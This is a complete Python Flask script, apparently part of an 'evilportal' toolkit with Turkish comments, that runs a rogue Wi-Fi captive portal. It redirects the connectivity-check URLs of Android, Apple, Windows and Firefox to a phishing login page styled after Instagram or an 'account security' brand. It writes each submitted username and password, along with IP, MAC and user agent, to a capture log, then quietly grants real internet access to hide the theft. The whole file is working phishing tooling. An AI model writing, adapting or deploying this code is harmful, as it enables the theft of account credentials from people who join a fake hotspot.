#!/usr/bin/env python3
"""evilportal — captive portal + credential capture.

- Tüm HTTP isteklerini karşılar (DNS wildcard ile her alan adı buraya düşer)
- OS probe endpoint'lerine 302 döner → CNA/portal açılır
- Form POST'unda kimlik bilgisini capture/creds.log'a yazar
- Başarılıysa istemci MAC'ini ipset'e ekler → gerçek internet açılır
"""
import json
import os
import re
import subprocess
import time

from flask import Flask, redirect, render_template_string, request

BASE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(BASE)
CAPTURE = os.path.join(ROOT, "capture", "creds.log")
os.makedirs(os.path.dirname(CAPTURE), exist_ok=True)


def load_config(path: str) -> dict:
    cfg: dict = {}
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            v = v.strip()
            if v[:1] in ("'", '"'):
                q = v[0]
                end = v.find(q, 1)
                v = v[1:end] if end != -1 else v[1:]
            else:
                v = v.split("#", 1)[0].strip()
            cfg[k.strip()] = v
    return cfg


CFG = load_config(os.path.join(ROOT, "config.sh"))
BRAND = CFG.get("BRAND", "Hesap Güvenliği")
SUCCESS_URL = CFG.get("SUCCESS_URL", "https://www.google.com")
PORT = int(CFG.get("PORTAL_PORT", "80"))
TEMPLATE = CFG.get("PORTAL_TEMPLATE", "instagram")
SET_NAME = "portal_auth"

app = Flask(__name__, template_folder=os.path.join(BASE, "templates"))

_tpl_path = os.path.join(BASE, "templates", f"{TEMPLATE}.html")
if not os.path.exists(_tpl_path):
    _tpl_path = os.path.join(BASE, "templates", "verify.html")
with open(_tpl_path, encoding="utf-8") as f:
    VERIFY_TMPL = f.read()
with open(os.path.join(BASE, "templates", "thanks.html"), encoding="utf-8") as f:
    THANKS_TMPL = f.read()


def mac_for_ip(ip: str) -> str | None:
    """ARP tablosundan IP → MAC."""
    try:
        out = subprocess.run(
            ["ip", "neigh", "show", ip], capture_output=True, text=True, timeout=3
        ).stdout
    except Exception:
        return None
    m = re.search(r"lladdr ([0-9a-fA-F:]{17})", out)
    return m.group(1).lower() if m else None


def authorize(ip: str) -> str | None:
    """İstemciyi MAC'i üzerinden whitelist'e al."""
    mac = mac_for_ip(ip)
    if not mac:
        # ARP kaydı yoksa kısa bir ping ile tetikle
        subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                       capture_output=True, timeout=4)
        mac = mac_for_ip(ip)
    if not mac:
        return None
    subprocess.run(["ipset", "add", SET_NAME, mac], capture_output=True)
    return mac


@app.route("/")
def index():
    return render_template_string(VERIFY_TMPL, brand=BRAND)


@app.route("/verify", methods=["POST"])
def verify():
    ip = request.remote_addr or ""
    mac = authorize(ip)
    rec = {
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "mac": mac,
        "username": request.form.get("username", ""),
        "password": request.form.get("password", ""),
        "ua": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
    }
    with open(CAPTURE, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    print(f"[+] {rec['ts']} {ip} {mac} -> {rec['username']}", flush=True)
    return render_template_string(THANKS_TMPL, brand=BRAND, target=SUCCESS_URL)


@app.route("/generate_204")
@app.route("/gen_204")
def android_probe():
    # 204 yerine 302 → Android captive portal algılar ve CNA açar
    return redirect("/", code=302)


@app.route("/hotspot-detect.html")
@app.route("/library/test/success.html")
def apple_probe():
    return redirect("/", code=302)


@app.route("/connecttest.txt")
@app.route("/ncsi.txt")
@app.route("/redirect")
def windows_probe():
    return redirect("/", code=302)


@app.route("/success.txt")
@app.route("/canonical.html")
def firefox_probe():
    return redirect("/", code=302)


@app.route("/<path:_path>")
def catch_all(_path):
    return redirect("/", code=302)


@app.errorhandler(404)
def not_found(_e):
    return redirect("/", code=302)


if __name__ == "__main__":
    print(f"[*] portal 0.0.0.0:{PORT}  |  capture: {CAPTURE}", flush=True)
    app.run(host="0.0.0.0", port=PORT, threaded=True)
